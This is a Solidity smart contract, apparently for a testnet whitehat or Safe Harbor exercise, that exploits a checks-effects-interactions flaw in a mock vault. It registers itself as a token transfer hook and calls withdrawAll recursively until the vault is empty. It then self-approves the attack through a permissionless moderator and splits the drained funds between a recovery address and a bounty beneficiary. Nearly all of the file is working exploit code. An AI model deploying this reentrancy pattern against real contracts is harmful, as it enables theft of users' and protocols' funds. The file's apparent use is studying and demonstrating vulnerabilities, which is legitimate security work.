// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerableVault {
    function deposit(uint256 amount) external;
    function withdrawAll() external;
}

interface IMockToken {
    function mint(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function setTransferHook(address hook) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IMockRegistryModerator {
    function approveAttack(address agreementAddress) external;
}

/// @title Attacker
/// @notice Exploits the CEI violation in VulnerableVault via reentrancy.
///
/// @dev ATTACK FLOW (driven by `attack()`)
///      1. Register this contract as a transfer hook on MockToken
///      2. Mint seed tokens and deposit them into VulnerableVault
///      3. Call withdrawAll() — vault transfers tokens via token.transfer()
///      4. MockToken sees our hook and calls onTokenTransfer()
///      5. In onTokenTransfer(), call withdrawAll() again (balance not yet cleared)
///      6. Repeat until the vault is empty
///      7. Distribute recovered funds per Safe Harbor bounty terms
///
///      `attack()` must be called AFTER this contract is deployed — the reentrancy
///      callback (onTokenTransfer) needs this contract's code to exist. See Exploit.sol
///      for the one-transaction wrapper that deploys + triggers it.
contract Attacker {
    IVulnerableVault public immutable VAULT;
    IMockToken public immutable TOKEN;
    address public immutable RECOVERY_ADDRESS; // protocol — receives the returned funds
    address public immutable BENEFICIARY; // whitehat — keeps the bounty
    address public immutable OWNER; // only this address may trigger attack()

    uint256 constant SEED_AMOUNT = 100e18; // enough to open a position; the vault does the rest
    uint256 constant BOUNTY_BPS = 1_000; // 10% — as agreed in the Safe Harbor terms

    constructor(address _vault, address _token, address _recovery, address _beneficiary) {
        VAULT = IVulnerableVault(_vault);
        TOKEN = IMockToken(_token);
        RECOVERY_ADDRESS = _recovery;
        BENEFICIARY = _beneficiary;
        OWNER = msg.sender;
    }

    /// @notice Called by MockToken.transfer() when this contract receives tokens.
    ///         This is the re-entry point — keep draining while the vault has funds.
    function onTokenTransfer(address, uint256) external {
        if (TOKEN.balanceOf(address(VAULT)) > 0) {
            VAULT.withdrawAll();
        }
    }

    /// @notice Open the agreement for attack (testnet moderator is permissionless), then
    ///         drain the vault via reentrancy and split the proceeds per Safe Harbor terms.
    /// @param agreement The Safe Harbor agreement to put UNDER_ATTACK.
    /// @param moderator The permissionless testnet moderator (pass address(0) to skip approval).
    function attack(address agreement, address moderator) external {
        require(msg.sender == OWNER, "only owner");

        // Open the contract for attack. On testnet the DAO role is a permissionless
        // mock moderator, so the whitehat's own transaction can approve it.
        if (moderator != address(0)) {
            IMockRegistryModerator(moderator).approveAttack(agreement);
        }

        // Register ourselves as a transfer hook — whenever this contract receives
        // tokens, MockToken will call our onTokenTransfer()
        TOKEN.setTransferHook(address(this));

        // Mint seed tokens (MockToken allows anyone to mint) and deposit to open a position
        TOKEN.mint(address(this), SEED_AMOUNT);
        TOKEN.approve(address(VAULT), SEED_AMOUNT);
        VAULT.deposit(SEED_AMOUNT);

        // First withdrawal triggers the reentrancy chain via onTokenTransfer
        VAULT.withdrawAll();

        // ── Safe Harbor fund distribution ──────────────────────────────────
        // The drained balance includes our own SEED_AMOUNT, so the bounty is taken on
        // the PROTOCOL's recovered funds only — we don't earn a bounty on our own seed.
        // The protocol gets its share back; we keep the bounty plus our reclaimed seed.
        uint256 total = TOKEN.balanceOf(address(this));
        uint256 recovered = total - SEED_AMOUNT;
        uint256 bounty = (recovered * BOUNTY_BPS) / 10_000;

        TOKEN.transfer(RECOVERY_ADDRESS, recovered - bounty);
        TOKEN.transfer(BENEFICIARY, bounty + SEED_AMOUNT);
    }
}
